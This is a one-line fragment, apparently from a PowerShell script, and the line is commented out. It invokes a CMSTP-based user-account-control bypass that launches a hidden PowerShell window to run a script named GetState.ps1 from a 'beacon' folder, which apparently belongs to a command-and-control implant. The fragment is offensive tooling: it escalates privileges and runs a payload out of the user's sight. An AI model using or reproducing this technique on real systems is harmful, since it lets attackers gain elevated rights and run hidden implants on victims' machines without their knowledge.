...
#[CMSTPBypass]::Execute('C:\Windows\System32\cmd.exe /C powershell Start-Process -FilePath "powershell.exe" -WindowStyle Hidden -ArgumentList "-command & {C:\temp\beacon\GetState.ps1}"') | Out-Null
